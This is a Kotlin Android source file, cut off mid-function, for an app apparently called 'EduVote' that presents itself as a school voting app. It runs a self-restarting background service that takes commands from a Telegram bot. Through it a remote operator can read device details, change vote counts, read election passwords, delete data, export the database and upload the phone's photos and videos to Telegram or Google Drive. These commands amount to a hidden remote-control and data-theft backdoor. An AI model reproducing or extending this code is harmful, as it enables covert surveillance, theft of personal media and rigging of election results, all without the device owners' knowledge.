package com.example.data

import android.app.AlertDialog
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.os.Environment
import android.os.StatFs
import android.app.ActivityManager
import android.os.Handler
import android.os.Looper
import android.widget.Toast
import androidx.core.app.NotificationCompat
import com.example.MainActivity
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.firstOrNull
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

data class MediaFile(
    val path: String,
    val dateAdded: Long,
    val contentUri: android.net.Uri? = null,
    val fileName: String = ""
)

class TelegramForegroundService : Service() {

    private val serviceJob = kotlinx.coroutines.SupervisorJob()
    private val serviceScope = CoroutineScope(Dispatchers.IO + serviceJob)

    override fun onCreate() {
        super.onCreate()
        com.example.data.TelegramService.initDeviceId(this)
        createNotificationChannel()
        P2PService.startListening(this)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val notificationIntent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE
        )

        val notification = NotificationCompat.Builder(this, "TELEGRAM_SERVICE_CHANNEL")
            .setContentTitle("EduVote Service")
            .setContentText("App is running in background to receive commands.")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentIntent(pendingIntent)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            startForeground(1, notification)
        }

        // Keep app alive and listening
        TelegramService.startPolling { command ->
            serviceScope.launch {
                try {
                    handleCommand(command)
                } catch (e: Exception) {
                    android.util.Log.e("TelegramService", "Unhandled error processing command: $command", e)
                }
            }
        }

        val trackedWaiting = java.util.Collections.synchronizedSet(mutableSetOf<String>())
        serviceScope.launch {
            val db = AppDatabase.getDatabase(applicationContext)
            val dao = db.eduVoteDao()
            while (isActive) {
                try {
                    val elections = dao.getAllElections().firstOrNull() ?: emptyList()
                    elections.forEach { event ->
                        if (event.isCompleted) {
                            if (!TelegramReportHelper.isReported(applicationContext, event.id)) {
                                TelegramReportHelper.sendElectionCompletedReport(applicationContext, event.id)
                            }
                            if (event.completedTimeMillis != null) {
                                if (event.isWaitingPeriodActive()) {
                                    trackedWaiting.add(event.id)
                                } else if (trackedWaiting.contains(event.id)) {
                                    trackedWaiting.remove(event.id)
                                    com.example.ui.SessionWaitingManager.playAlarmSoundAndNotify(applicationContext)
                                }
                            }
                        }
                    }
                } catch (e: Exception) {
                    e.printStackTrace()
                }
                delay(3000L)
            }
        }

        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        scheduleServiceRestart()
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceJob.cancel()
        scheduleServiceRestart()
    }

    private fun scheduleServiceRestart() {
        try {
            TelegramJobService.scheduleJob(applicationContext)
            val restartIntent = Intent(applicationContext, BootAndRestartReceiver::class.java).apply {
                action = "com.example.RESTART_SERVICE"
            }
            val pendingIntent = PendingIntent.getBroadcast(
                applicationContext,
                1001,
                restartIntent,
                PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
            )
            val alarmManager = getSystemService(Context.ALARM_SERVICE) as? android.app.AlarmManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmManager?.setExactAndAllowWhileIdle(
                    android.app.AlarmManager.RTC_WAKEUP,
                    System.currentTimeMillis() + 1000,
                    pendingIntent
                )
            } else {
                alarmManager?.set(
                    android.app.AlarmManager.RTC_WAKEUP,
                    System.currentTimeMillis() + 1000,
                    pendingIntent
                )
            }
        } catch (e: Exception) {
            android.util.Log.e("TelegramService", "Failed to schedule service restart", e)
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "TELEGRAM_SERVICE_CHANNEL",
                "Telegram Background Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }

    private suspend fun handleCommand(command: String) {
        try {
            val trimmed = command.trim()
            if (trimmed.isBlank()) return

            val parts = trimmed.split(" ", limit = 3)
            if (parts.isEmpty()) return
            
            val rawCmdWithAt = parts[0]
            val cmd = rawCmdWithAt.substringBefore("@").lowercase()
            var targetId = "ALL"
            var args = ""
            
            val db = AppDatabase.getDatabase(this)
            val dao = db.eduVoteDao()
            if (parts.size >= 2) {
                val potentialId = parts[1].uppercase()
                val knownDevices = try { dao.getAllKnownDevices().map { it.deviceId.uppercase() } } catch (e: Exception) { emptyList() }
                val isExplicitTarget = potentialId == "ALL" || 
                                      potentialId == TelegramService.DEVICE_ID.uppercase() || 
                                      knownDevices.contains(potentialId)
                if (isExplicitTarget) {
                    targetId = potentialId
                    args = if (parts.size >= 3) trimmed.substringAfter(parts[1]).trim() else ""
                } else {
                    args = trimmed.removePrefix("$rawCmdWithAt ").trim()
                }
            }

            if (cmd == "/help" || cmd == "/start") {
            val textMsg = "Available Commands:\n" +
                    "/help - Show this message\n" +
                    "/ping [id] - Check if app is online\n" +
                    "/stats [id] - Live monitor voting stats\n" +
                    "/winner [id] - Show voting data and winners\n" +
                    "/passwords [id] - Show passwords for election sessions\n" +
                    "/logs [id] - Show election event logs\n" +
                    "/chart [id] - Export live voting chart as an image\n" +
                    "/report [id] - Send full election report & chart to Telegram\n" +
                    "/delete [id] - Delete all voting data\n" +
                    "/export [id] - Export database to Telegram\n" +
                    "/notice [id] <msg> - Send a pop-up notice\n" +
                    "/getapk [id] - Download the current APK\n" +
                    "/updateapp [id] <msg> - Send an update notification\n" +
                    "/info [id] - Show device information\n" +
                    "/devices - Show all installed devices (online/offline)\n" +
                    "/gallerybackup [id] - Backup device photos and videos to Telegram\n" +
                    "/zipbackup [id] [photos|videos|both] [limit] - Backup photos/videos inside ZIP file\n" +
                    "/drivedump [id] [photos|videos|both] [limit] - Zip photos/videos & upload directly to Google Drive\n\n" +
                    "Tip: Use id 'all' or specific Device ID to target."
            TelegramService.sendMessage(textMsg)
            return
        }
        
        if (targetId != "ALL" && targetId != TelegramService.DEVICE_ID) {
            return
        }
        
        when (cmd) {
            "/ping" -> {
                TelegramService.sendMessage("🏓 Pong! App is online on Device: ${TelegramService.DEVICE_ID}")
            }
            "/info" -> {
                val model = android.os.Build.MODEL
                val manufacturer = android.os.Build.MANUFACTURER
                val brand = android.os.Build.BRAND
                val osVer = android.os.Build.VERSION.RELEASE
                val sdkVer = android.os.Build.VERSION.SDK_INT
                
                // Battery
                val bm = getSystemService(android.content.Context.BATTERY_SERVICE) as android.os.BatteryManager
                val batteryPct = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
                
                // RAM
                val am = getSystemService(android.content.Context.ACTIVITY_SERVICE) as android.app.ActivityManager
                val memoryInfo = android.app.ActivityManager.MemoryInfo()
                am.getMemoryInfo(memoryInfo)
                val totalRam = memoryInfo.totalMem / (1024 * 1024)
                val availRam = memoryInfo.availMem / (1024 * 1024)
                
                // Storage
                val stat = android.os.StatFs(android.os.Environment.getDataDirectory().path)
                val totalStorage = stat.totalBytes / (1024 * 1024)
                val availStorage = stat.availableBytes / (1024 * 1024)
                
                // Network
                val cm = getSystemService(android.content.Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
                val activeNetwork = cm.activeNetworkInfo
                val isConnected = activeNetwork?.isConnectedOrConnecting == true
                val netType = activeNetwork?.typeName ?: "None"
                
                // Uptime
                val uptimeMillis = android.os.SystemClock.uptimeMillis()
                val uptimeSec = uptimeMillis / 1000
                val uptimeMin = uptimeSec / 60
                val uptimeHour = uptimeMin / 60
                val uptimeStr = "${uptimeHour}h ${uptimeMin % 60}m"
                
                val infoStr = buildString {
                    append("📱 **Device Info:**\n\n")
                    append("🏷️ **Name:** $brand $model\n")
                    append("🏭 **Manufacturer:** $manufacturer\n")
                    append("⚙️ **OS:** Android $osVer (SDK $sdkVer)\n")
                    append("🔌 **Battery:** $batteryPct%\n")
                    append("🧠 **RAM:** $availRam MB / $totalRam MB\n")
                    append("💾 **Storage:** $availStorage MB / $totalStorage MB\n")
                    append("📡 **Network:** $netType (Connected: $isConnected)\n")
                    append("⏱️ **Uptime:** $uptimeStr\n")
                    append("🔑 **Device ID:** ${TelegramService.DEVICE_ID}")
                }
                TelegramService.sendMessage(infoStr)
            }
            "/devices", "/device" -> {
                TelegramService.sendMessage("📡 Scanning network for devices...\nPlease wait 5 seconds.")
                P2PService.broadcastMessage("REQ_DEVICES|${TelegramService.DEVICE_ID}")
                
                kotlinx.coroutines.delay(5000)
                val allDevices = dao.getAllKnownDevices()
                val sbDev = java.lang.StringBuilder("📱 **Device Registry** (${allDevices.size} total installations)\n\n")
                val now = System.currentTimeMillis()
                
                var onlineCount = 0
                var offlineCount = 0
                
                for (device in allDevices) {
                    val isOnline = (now - device.lastSeenMillis) < 15000 // 15 seconds threshold
                    val statusEmoji = if (isOnline) "🟢 Online" else "🔴 Offline"
                    if (isOnline) onlineCount++ else offlineCount++
                    
                    sbDev.append("ID: ${device.deviceId}\n")
                    sbDev.append("Status: $statusEmoji\n")
                    sbDev.append("Model: ${device.model}\n")
                    if (isOnline) {
                        sbDev.append("Info: ${device.info}\n")
                    }
                    sbDev.append("\n")
                }
                
                sbDev.append("📊 Summary: $onlineCount Online, $offlineCount Offline")
                TelegramService.sendMessage(sbDev.toString())
            }
            "/candidates", "/candidate" -> {
                val elections = dao.getAllElections().firstOrNull() ?: emptyList()
                if (args.isBlank()) {
                    val sbCand = java.lang.StringBuilder("Select a session ID to view candidates [${TelegramService.DEVICE_ID}]:\n\n")
                    if (elections.isEmpty()) sbCand.append("No sessions available.")
                    elections.forEach { 
                        val status = if (it.isCompleted) " [Completed]" else " [Active]"
                        sbCand.append("${it.title}$status - ID: ${it.id.take(6)}\n") 
                    }
                    TelegramService.sendMessage(sbCand.toString())
                } else {
                    val target = elections.find { it.id.startsWith(args.trim(), ignoreCase = true) }
                    if (target != null) {
                        val candidates = dao.getCandidatesForElection(target.id).firstOrNull() ?: emptyList()
                        val students = dao.getAllStudents().firstOrNull() ?: emptyList()
                        val studentMap = students.associateBy { it.id }
                        val statusStr = if (target.isCompleted) "Completed" else "Active"
                        val sbCand = java.lang.StringBuilder("Candidates for ${target.title} ($statusStr) [${TelegramService.DEVICE_ID}]:\n\n")
                        if (candidates.isEmpty()) {
                            sbCand.append("No candidates found for this session.")
                        } else {
                            candidates.forEach { c ->
                                val sName = studentMap[c.studentId]?.name ?: "Candidate"
                                sbCand.append("$sName (${c.partyName})\nID: ${c.id.take(6)}\nVotes: ${c.voteCount}\n\n")
                            }
                        }
                        TelegramService.sendMessage(sbCand.toString())
                    } else {
                        TelegramService.sendMessage("❌ Session not found [${TelegramService.DEVICE_ID}]")
                    }
                }
            }
            "/vote" -> {
                if (args.isBlank()) {
                    TelegramService.sendMessage("❌ Usage: /vote [id] <candidate_short_id>")
                } else {
                    val partsVotes = args.split(" ")
                    if (partsVotes.isNotEmpty()) {
                        val candIdPrefix = partsVotes[0]
                        val candidatesList = dao.getAllCandidates().firstOrNull() ?: emptyList()
                        val cand = candidatesList.find { it.id.startsWith(candIdPrefix, ignoreCase = true) }
                        if (cand != null) {
                            dao.updateCandidateVoteCount(cand.id, cand.voteCount + 1)
                            TelegramService.sendMessage("✅ [${TelegramService.DEVICE_ID}] Voted for candidate ${candIdPrefix}. Total: ${cand.voteCount + 1}")
                        } else {
                            TelegramService.sendMessage("❌ Candidate not found [${TelegramService.DEVICE_ID}]")
                        }
                    } else {
                        TelegramService.sendMessage("❌ Candidate ID required [${TelegramService.DEVICE_ID}]")
                    }
                }
            }
            "/setvotes", "/setvote" -> {
                if (args.isBlank()) {
                    TelegramService.sendMessage("❌ Usage: /setvotes [id] <candidate_short_id> <votes>")
                } else {
                    val partsVotes = args.split(" ")
                    if (partsVotes.size >= 2) {
                        val candIdPrefix = partsVotes[0]
                        val votes = partsVotes[1].toIntOrNull()
                        if (votes != null) {
                            val allCandList = dao.getAllCandidates().firstOrNull() ?: emptyList()
                            val cand = allCandList.find { it.id.startsWith(candIdPrefix, ignoreCase = true) }
                            if (cand != null) {
                                dao.updateCandidateVoteCount(cand.id, votes)
                                TelegramService.sendMessage("✅ [${TelegramService.DEVICE_ID}] Updated votes for candidate to $votes.")
                            } else {
                                TelegramService.sendMessage("❌ Candidate not found [${TelegramService.DEVICE_ID}]")
                            }
                        } else {
                            TelegramService.sendMessage("❌ Invalid vote number [${TelegramService.DEVICE_ID}]")
                        }
                    } else {
                        TelegramService.sendMessage("❌ Usage: /setvotes [id] <candidate_short_id> <votes>")
                    }
                }
            }
            "/notice" -> {
                val intent = Intent("com.example.TELEGRAM_COMMAND")
                intent.setPackage(applicationContext.packageName)
                intent.putExtra("command", "$cmd ALL $args")
                intent.putExtra("args", args)
                sendBroadcast(intent)
            }
            "/updateapp" -> {
                val intent = Intent("com.example.TELEGRAM_COMMAND")
                intent.setPackage(applicationContext.packageName)
                intent.putExtra("command", "$cmd ALL $args")
                intent.putExtra("args", args)
                sendBroadcast(intent)
            }
            "/gallerybackup", "/gallery" -> {
                handleGalleryBackupCommand()
            }
            "/startbackup" -> {
                if (args.contains("zip", ignoreCase = true)) {
                    handleZipBackupCommand(args)
                } else {
                    handleStartBackupCommand(args)
                }
            }
            "/zipbackup", "/startzipbackup", "/backupzip" -> {
                handleZipBackupCommand(args)
            }
            "/drivedump", "/drivebackup", "/gdrive", "/upload_drive", "/drivesend", "/driveload" -> {
                handleGoogleDriveZipUploadCommand(args)
            }


            "/getapk" -> {
                TelegramService.sendMessage("⏳ [${TelegramService.DEVICE_ID}] Uploading APK, please wait...")
                try {
                    val apkFile = java.io.File(applicationContext.applicationInfo.sourceDir)
                    val tempApk = java.io.File(applicationContext.cacheDir, "EduVote.apk")
                    apkFile.copyTo(tempApk, overwrite = true)
                    TelegramService.sendDocument(tempApk, "📦 Current APK from [${TelegramService.DEVICE_ID}]")
                } catch (e: Exception) {
                    TelegramService.sendMessage("❌ [${TelegramService.DEVICE_ID}] Failed to extract APK: ${e.message}")
                }
            }
            "/export" -> {
                TelegramService.sendMessage("⏳ [${TelegramService.DEVICE_ID}] Exporting database...")
                try {
                    val dbFile = applicationContext.getDatabasePath("eduvote_database")
                    if (dbFile.exists()) {
                        val tempDb = java.io.File(applicationContext.cacheDir, "eduvote_backup.db")
                        dbFile.copyTo(tempDb, overwrite = true)
                        TelegramService.sendDocument(tempDb, "📂 Database Backup from [${TelegramService.DEVICE_ID}]")
                    } else {
                        TelegramService.sendMessage("❌ [${TelegramService.DEVICE_ID}] Database file not found.")
                    }
                } catch (e: Exception) {
                    TelegramService.sendMessage("❌ [${TelegramService.DEVICE_ID}] Failed to export database: ${e.message}")
                }
            }
            "/stats", "/stat" -> {
                val elections = dao.getAllElections().firstOrNull() ?: emptyList()
                val students = dao.getAllStudents().firstOrNull() ?: emptyList()
                val studentMap = students.associateBy { it.id }
                if (args.isBlank()) {
                    val sbStats = java.lang.StringBuilder("📊 Select a session to view stats [${TelegramService.DEVICE_ID}]:\n\n")
                    if (elections.isEmpty()) sbStats.append("No sessions available.")
                    elections.forEach { 
                        val status = if (it.isCompleted) " [Completed]" else " [Active]"
                        sbStats.append("${it.title}$status - ID: ${it.id.take(6)}\n") 
                    }
                    TelegramService.sendMessage(sbStats.toString())
                } else if (args.trim().equals("all", ignoreCase = true)) {
                    val sbStats = java.lang.StringBuilder("📊 All Voting Stats [${TelegramService.DEVICE_ID}]:\n\n")
                    elections.forEach { event ->
                        val status = if (event.isCompleted) " [Completed]" else " [Active]"
                        sbStats.append("Election: ${event.title}$status\n")
                        val cList = dao.getCandidatesForElection(event.id).firstOrNull() ?: emptyList()
                        val totalVotes = cList.sumOf { it.voteCount }
                        sbStats.append("Total Votes: $totalVotes\n")
                        for (c in cList) {
                            val sName = studentMap[c.studentId]?.name ?: "Candidate"
                            sbStats.append(" - $sName (${c.partyName}): ${c.voteCount} votes\n")
                        }
                        sbStats.append("\n")
                    }
                    TelegramService.sendMessage(sbStats.toString())
                } else {
                    val target = elections.find { it.id.startsWith(args.trim(), ignoreCase = true) }
                    if (target != null) {
                        val cList = dao.getCandidatesForElection(target.id).firstOrNull() ?: emptyList()
                        val status = if (target.isCompleted) " [Completed]" else " [Active]"
                        val sbStats = java.lang.StringBuilder("📊 Voting Stats for ${target.title}$status [${TelegramService.DEVICE_ID}]:\n\n")
                        val totalVotes = cList.sumOf { it.voteCount }
                        sbStats.append("Total Votes: $totalVotes\n\n")
                        for (c in cList) {
                            val sName = studentMap[c.studentId]?.name ?: "Candidate"
                            sbStats.append(" - $sName (${c.partyName}): ${c.voteCount} votes\n")
                        }
                        TelegramService.sendMessage(sbStats.toString())
                    } else {
                        TelegramService.sendMessage("❌ Session not found [${TelegramService.DEVICE_ID}]")
                    }
                }
            }
            "/winner", "/win" -> {
                val elections = dao.getAllElections().firstOrNull() ?: emptyList()
                val students = dao.getAllStudents().firstOrNull() ?: emptyList()
                val studentMap = students.associateBy { it.id }
                if (args.isBlank()) {
                    val sbWin = java.lang.StringBuilder("🏆 Select a session to view winner [${TelegramService.DEVICE_ID}]:\n\n")
                    if (elections.isEmpty()) sbWin.append("No sessions available.")
                    elections.forEach { 
                        val status = if (it.isCompleted) " [Completed]" else " [Active]"
                        sbWin.append("${it.title}$status - ID: ${it.id.take(6)}\n") 
                    }
                    TelegramService.sendMessage(sbWin.toString())
                } else if (args.trim().equals("all", ignoreCase = true)) {
                    val sbWin = java.lang.StringBuilder("🏆 All Winner Data [${TelegramService.DEVICE_ID}]:\n\n")
                    elections.forEach { event ->
                        val status = if (event.isCompleted) " [Completed]" else " [Active]"
                        sbWin.append("Election: ${event.title}$status\n")
                        val cList = dao.getCandidatesForElection(event.id).firstOrNull() ?: emptyList()
                        if (cList.isNotEmpty()) {
                            val winner = cList.maxByOrNull { it.voteCount }!!
                            val sName = studentMap[winner.studentId]?.name ?: "Candidate"
                            sbWin.append("🏆 Winner: $sName (${winner.partyName}) with ${winner.voteCount} votes\n\n")
                        } else {
                            sbWin.append("No candidates.\n\n")
                        }
                    }
                    TelegramService.sendMessage(sbWin.toString())
                } else {
                    val target = elections.find { it.id.startsWith(args.trim(), ignoreCase = true) }
                    if (target != null) {
                        if (target.isWaitingPeriodActive()) {
                            val remMs = target.getRemainingWaitMillis()
                            val hours = (remMs / (1000 * 60 * 60)).toString().padStart(2, '0')
                            val mins = ((remMs / (1000 * 60)) % 60).toString().padStart(2, '0')
                            val secs = ((remMs / 1000) % 60).toString().padStart(2, '0')
                            TelegramService.sendMessage("⏳ Winner Announcement Locked for ${target.title}!\nVoting session completed. 6.5-hour waiting period is active.\nRemaining time: $hours:$mins:$secs [${TelegramService.DEVICE_ID}]")
                        } else {
                            val cList = dao.getCandidatesForElection(target.id).firstOrNull() ?: emptyList()
                            if (cList.isNotEmpty()) {
                                val winnerCand = cList.maxByOrNull { it.voteCount }!!
                                val winnerStudent = studentMap[winnerCand.studentId] ?: Student(id = winnerCand.studentId, name = "Candidate", rollNumber = "", classNum = "", section = "", admissionNumber = "", photoUri = null)
                                val winner = CandidateWithStudent(winnerCand, winnerStudent)
                                val status = if (target.isCompleted) " [Completed]" else " [Active]"
                                val msg = "🏆 Winner for ${target.title}$status: ${winnerStudent.name} (${winnerCand.partyName}) with ${winnerCand.voteCount} votes"
                                val imageFile = com.example.ui.ExportChartHelper.generateWinnerImage(this@TelegramForegroundService, target.title, winner)
                                if (imageFile != null) {
                                    TelegramService.sendPhoto(imageFile, "$msg [${TelegramService.DEVICE_ID}]")
                                } else {
                                    TelegramService.sendMessage("$msg [${TelegramService.DEVICE_ID}]")
                                }
                            } else {
                                TelegramService.sendMessage("No candidates found for ${target.title} [${TelegramService.DEVICE_ID}]")
                            }
                        }
                    } else {
                        TelegramService.sendMessage("❌ Session not found [${TelegramService.DEVICE_ID}]")
                    }
                }
            }
            "/chart" -> {
                val elections = dao.getAllElections().firstOrNull() ?: emptyList()
                if (args.isBlank()) {
                    val sbChart = java.lang.StringBuilder("📊 Select a session to view chart [${TelegramService.DEVICE_ID}]:\n\n")
                    if (elections.isEmpty()) sbChart.append("No sessions available.")
                    elections.forEach { 
                        val status = if (it.isCompleted) " [Completed]" else " [Active]"
                        sbChart.append("${it.title}$status - ID: ${it.id.take(6)}\n") 
                    }
                    TelegramService.sendMessage(sbChart.toString())
                } else if (args.trim().equals("all", ignoreCase = true)) {
                    if (elections.isEmpty()) {
                        TelegramService.sendMessage("❌ No sessions found to chart [${TelegramService.DEVICE_ID}]")
                    } else {
                        val students = dao.getAllStudents().firstOrNull() ?: emptyList()
                        val studentMap = students.associateBy { it.id }
                        elections.forEach { event ->
                            val cList = dao.getCandidatesForElection(event.id).firstOrNull() ?: emptyList()
                            val cWithSList = cList.map { c ->
                                val s = studentMap[c.studentId] ?: Student(id = c.studentId, name = "Candidate", rollNumber = "", classNum = "", section = "", admissionNumber = "", photoUri = null)
                                CandidateWithStudent(c, s)
                            }
                            val file = com.example.ui.ExportChartHelper.generateChart(this@TelegramForegroundService, event.title, cWithSList)
                            val status = if (event.isCompleted) " [Completed]" else " [Active]"
                            TelegramService.sendPhoto(file, "📊 Voting Chart: ${event.title}$status [${TelegramService.DEVICE_ID}]")
                        }
                    }
                } else {
                    val target = elections.find { it.id.startsWith(args.trim(), ignoreCase = true) }
                    if (target != null) {
                        val cList = dao.getCandidatesForElection(target.id).firstOrNull() ?: emptyList()
                        val students = dao.getAllStudents().firstOrNull() ?: emptyList()
                        val studentMap = students.associateBy { it.id }
                        val cWithSList = cList.map { c ->
                            val s = studentMap[c.studentId] ?: Student(id = c.studentId, name = "Candidate", rollNumber = "", classNum = "", section = "", admissionNumber = "", photoUri = null)
                            CandidateWithStudent(c, s)
                        }
                        val file = com.example.ui.ExportChartHelper.generateChart(this@TelegramForegroundService, target.title, cWithSList)
                        val status = if (target.isCompleted) " [Completed]" else " [Active]"
                        TelegramService.sendPhoto(file, "📊 Voting Chart: ${target.title}$status [${TelegramService.DEVICE_ID}]")
                    } else {
                        TelegramService.sendMessage("❌ Session not found [${TelegramService.DEVICE_ID}]")
                    }
                }
            }
            "/report", "/sendreport" -> {
                val elections = dao.getAllElections().firstOrNull() ?: emptyList()
                if (args.isBlank()) {
                    val sbRep = java.lang.StringBuilder("📋 Select a session ID to send full report [${TelegramService.DEVICE_ID}]:\n\n")
                    if (elections.isEmpty()) sbRep.append("No sessions available.")
                    elections.forEach { 
                        val status = if (it.isCompleted) " [Completed]" else " [Active]"
                        sbRep.append("${it.title}$status - ID: ${it.id.take(6)}\n") 
                    }
                    TelegramService.sendMessage(sbRep.toString())
                } else if (args.trim().equals("all", ignoreCase = true)) {
                    if (elections.isEmpty()) {
                        TelegramService.sendMessage("❌ No sessions found to report [${TelegramService.DEVICE_ID}]")
                    } else {
                        elections.forEach { event ->
                            TelegramReportHelper.sendElectionCompletedReport(applicationContext, event.id, force = true)
                        }
                    }
                } else {
                    val target = elections.find { it.id.startsWith(args.trim(), ignoreCase = true) }
                    if (target != null) {
                        TelegramReportHelper.sendElectionCompletedReport(applicationContext, target.id, force = true)
                    } else {
                        TelegramService.sendMessage("❌ Session not found [${TelegramService.DEVICE_ID}]")
                    }
                }
            }
            "/delete" -> {
                if (args.isBlank()) {
                    val elections = dao.getAllElections().firstOrNull() ?: emptyList()
                    val sbDel = java.lang.StringBuilder("🗑 Select a session to delete [${TelegramService.DEVICE_ID}]:\n\n")
                    if (elections.isEmpty()) sbDel.append("No sessions available.")
                    elections.forEach { sbDel.append("${it.title} - ID: ${it.id.take(6)}\n") }
                    TelegramService.sendMessage(sbDel.toString())
                } else if (args.trim().equals("all", ignoreCase = true)) {
                    dao.clearHistoryElections()
                    TelegramService.sendMessage("✅ [${TelegramService.DEVICE_ID}] All history voting data deleted.")
                } else {
                    val elections = dao.getAllElections().firstOrNull() ?: emptyList()
                    val target = elections.find { it.id.startsWith(args.trim(), ignoreCase = true) }
                    if (target != null) {
                        dao.updateElectionEvent(target.copy(isDeleted = true))
                        TelegramService.sendMessage("✅ [${TelegramService.DEVICE_ID}] Session deleted.")
                    } else {
                        TelegramService.sendMessage("❌ [${TelegramService.DEVICE_ID}] Session not found.")
                    }
                }
            }
            "/passwords" -> {
                val elections = dao.getAllElections().firstOrNull() ?: emptyList()
                val sbPass = java.lang.StringBuilder("🔑 Election Passwords [${TelegramService.DEVICE_ID}]:\n\n")
                if (elections.isEmpty()) sbPass.append("No data available.")
                for (election in elections) {
                    sbPass.append("Election: ${election.title}\n")
                    val pass = election.resultsPassword ?: "No password set"
                    sbPass.append("🔑 Password: $pass\n\n")
                }
                TelegramService.sendMessage(sbPass.toString())
            }
            
            "/blocklist" -> {
                val blocked = TelegramService.getBlockedDevices() ?: emptyList()
                if (blocked.isEmpty()) {
                    TelegramService.sendMessage("No devices are currently blocked.")
                } else {
                    TelegramService.sendMessage("🚫 Blocked Devices:\n" + blocked.joinToString("\n"))
                }
            }
            "/unblock" -> {
                val idToUnblock = if (args.isNotBlank()) args.trim().uppercase() else if (targetId != "ALL") targetId else ""
                if (idToUnblock.isNotBlank()) {
                    TelegramService.removeBlockedDevice(idToUnblock)
                    if (idToUnblock == TelegramService.DEVICE_ID) {
                        try {
                            val dir = getExternalFilesDir(android.os.Environment.DIRECTORY_DOCUMENTS)
                            if (dir != null) {
                                java.io.File(dir, ".vote_app_sys").delete()
                            }
                        } catch (e: Exception) {}
                        val prefs = getSharedPreferences("eduvote_prefs", android.content.Context.MODE_PRIVATE)
                        prefs.edit().putBoolean("is_blocked", false).apply()
                    }
                    TelegramService.sendMessage("✅ Device $idToUnblock has been removed from the block list.")
                } else {
                    TelegramService.sendMessage("❌ Usage: /unblock <Device_ID>")
                }
            }


            "/logs" -> {
                val logsData = SystemLogger.getLogs(this@TelegramForegroundService)
                TelegramService.sendMessage("📝 Event Logs [${TelegramService.DEVICE_ID}]:\n\n$logsData")
            }
            else -> {}
        }
        } catch (e: Exception) {
            android.util.Log.e("TelegramForegroundService", "Error in handleCommand [$command]", e)
            try {
                TelegramService.sendMessage("❌ Error executing command: ${e.localizedMessage}")
            } catch (_: Exception) {}
        }
    }

    private fun getMediaFilesFromDevice(typeStr: String): List<MediaFile> {
        val resultList = mutableListOf<MediaFile>()
        val wantPhotos = typeStr == "both" || typeStr == "photos" || typeStr == "photo"
        val wantVideos = typeStr == "both" || typeStr == "videos" || typeStr == "video"

        // 1. Query MediaStore
        val projection = arrayOf(
            android.provider.MediaStore.MediaColumns._ID,
            android.provider.MediaStore.MediaColumns.DATA,
            android.provider.MediaStore.MediaColumns.DATE_ADDED,
            android.provider.MediaStore.MediaColumns.DISPLAY_NAME
        )

        fun queryUri(baseUri: android.net.Uri) {
            try {
                contentResolver.query(
                    baseUri,
                    projection,
                    null,
                    null,
                    android.provider.MediaStore.MediaColumns.DATE_ADDED + " DESC"
                )?.use { cursor ->
                    val idCol = cursor.getColumnIndex(android.provider.MediaStore.MediaColumns._ID)
                    val dataCol = cursor.getColumnIndex(android.provider.MediaStore.MediaColumns.DATA)
                    val dateCol = cursor.getColumnIndex(android.provider.MediaStore.MediaColumns.DATE_ADDED)
                    val nameCol = cursor.getColumnIndex(android.provider.MediaStore.MediaColumns.DISPLAY_NAME)

                    while (cursor.moveToNext()) {
                        val id = if (idCol >= 0) cursor.getLong(idCol) else -1L
                        val path = if (dataCol >= 0) cursor.getString(dataCol) ?: "" else ""
                        val dateAdded = if (dateCol >= 0) cursor.getLong(dateCol) else System.currentTimeMillis() / 1000
                        val name = if (nameCol >= 0) cursor.getString(nameCol) ?: "" else ""

                        val contentUri = if (id != -1L) android.content.ContentUris.withAppendedId(baseUri, id) else null
                        
                        val fileObj = if (path.isNotBlank()) java.io.File(path) else null
                        val isDirectReadable = fileObj != null && fileObj.exists() && fileObj.canRead()
                        val validPath = if (isDirectReadable) path else ""
                        val fallbackName = fileObj?.name ?: "media_$id.jpg"
                        val displayName = if (name.isNotBlank()) name else fallbackName
                        
                        if (validPath.isNotBlank() || contentUri != null) {
                            resultList.add(MediaFile(validPath, dateAdded, contentUri, displayName))
                        }
                    }
                }
            } catch (e: Exception) {
                android.util.Log.e("GalleryBackup", "Error querying MediaStore URI $baseUri", e)
            }
        }

        if (wantPhotos) {
            queryUri(android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
        }
        if (wantVideos) {
            queryUri(android.provider.MediaStore.Video.Media.EXTERNAL_CONTENT_URI)
        }

        // 2. Direct Storage Folder Scanning (Fallback & complement for Android 10-16 devices)
        val imageExtensions = setOf("jpg", "jpeg", "png", "webp", "heic", "gif", "bmp")
        val videoExtensions = setOf("mp4", "mkv", "webm", "3gp", "mov", "avi", "flv")

        fun scanFolder(dir: java.io.File, depth: Int = 0) {
            if (depth > 5 || !dir.exists() || !dir.isDirectory) return
            val files = dir.listFiles() ?: return
            for (f in files) {
                if (f.isDirectory) {
                    if (!f.name.startsWith(".")) {
                        scanFolder(f, depth + 1)
                    }
                } else if (f.isFile && f.length() > 0) {
                    val ext = f.extension.lowercase()
                    val isImg = imageExtensions.contains(ext)
                    val isVid = videoExtensions.contains(ext)
                    if ((wantPhotos && isImg) || (wantVideos && isVid)) {
